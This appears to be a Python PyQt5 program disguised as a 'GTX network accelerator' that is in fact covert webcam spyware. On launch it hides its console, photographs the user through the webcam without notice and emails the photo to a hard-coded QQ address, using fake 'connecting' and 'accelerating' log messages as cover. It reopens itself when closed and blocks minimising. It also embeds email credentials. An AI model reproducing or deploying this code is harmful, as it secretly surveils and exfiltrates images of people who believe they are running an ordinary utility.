import ctypes
ctypes.windll.kernel32.FreeConsole()
import cv2
import yagmail
import time
import smtplib
from email.mime.text import MIMEText
import sys
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QPushButton, QTextEdit, QLineEdit, QLabel)
from PyQt5.QtCore import Qt

# ====================== 邮箱配置  ======================
SENDER_EMAIL =    "1913000981@qq.com"
EMAIL_AUTH_CODE = "qwertyuiopasdfgh"
RECEIVER_EMAIL =  "1913000981@qq.com"

sender = '1913000981@qq.com'
auth_code = 'uvyaubxqfqkrchff'
receiver = '1913000981@qq.com'
mail_subject = "反馈消息"
photo_path = "D:/auto_photo.jpg"
# ============================================================

class MainUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("GTX网络加速器")
        self.setFixedSize(500, 400)

        # 中心部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(10)
        layout.setContentsMargins(30, 30, 30, 30)

        # 日志显示框
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setPlaceholderText("运行日志将在这里显示...")
        layout.addWidget(self.log_text)

        # 留言输入
        layout.addWidget(QLabel("可以输入联系方式/留言："))
        self.msg_edit = QLineEdit()
        self.msg_edit.setPlaceholderText("请输入")
        layout.addWidget(self.msg_edit)

        # 按钮
        self.btn_take = QPushButton("1. 连接服务器")
        self.btn_take.clicked.connect(self.take_photo)
        layout.addWidget(self.btn_take)

        self.btn_send_photo = QPushButton("2. 开始加速")
        self.btn_send_photo.clicked.connect(self.send_photo_mail)
        layout.addWidget(self.btn_send_photo)

        self.btn_send_msg = QPushButton("3. 提交留言反馈")
        self.btn_send_msg.clicked.connect(self.send_msg_mail)
        layout.addWidget(self.btn_send_msg)

    def log(self, text):
        """打印日志到界面"""
        self.log_text.append(text)

    def take_photo(self):
        self.log("连接中...")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            self.log("错误:权限不足,联系1913000981@qq.com售后服务")
            return

        time.sleep(1)#需要加上.让摄像头有时间调焦一下,不然光线调控很差
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(photo_path, frame)
            self.log(f"连接成功")
        else:
            self.log("重连失败,联系1913000981@qq.com售后服务")

        cap.release()
        cv2.destroyAllWindows()

    def send_photo_mail(self):
        self.log("正在加速...")
        try:
            yag = yagmail.SMTP(
                user=SENDER_EMAIL,
                password=EMAIL_AUTH_CODE,
                host='smtp.qq.com',
                port=465,
                smtp_ssl=True
            )
            subject = "最新照片"
            contents = "照片如下"
            yag.send(
                to=RECEIVER_EMAIL,
                subject=subject,
                contents=contents,
                attachments=photo_path
            )
            self.log("✅ 加速成功")
        except Exception as e:
            self.log(f"❌ 加速失败：{e}，请联系售后")

    def send_msg_mail(self):
        message = self.msg_edit.text().strip()
        if not message:
            self.log("请输入")
            return
        
        self.log("正在提交留言反馈...")
        try:
            msg = MIMEText(message, 'plain', 'utf-8')
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = mail_subject

            smtp = smtplib.SMTP_SSL('smtp.qq.com', 465)
            smtp.login(sender, auth_code)
            smtp.sendmail(sender, receiver, msg.as_string())
            smtp.quit()
            self.log("✅ 反馈提交成功")
        except Exception as e:
            self.log("❌ 反馈提交失败")
    def closeEvent(self, event):
        # 拦截原本的关闭操作，不让窗口关闭
        event.ignore()
        # 关闭当前窗口
       # self.hide()
        # 新建一个一模一样的窗口并显示
        self.new_win = MainUI()
        self.new_win.show()
    def changeEvent(self, event):
        if event.type() == event.WindowStateChange:
            if self.isMinimized():
                event.ignore()  # 直接不让最小化
                self.showNormal()  # 保持正常窗口
if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainUI()
    win.take_photo()        # 自动拍照
    win.send_photo_mail()   # 自动发送邮件
    win.show()
    sys.exit(app.exec_())
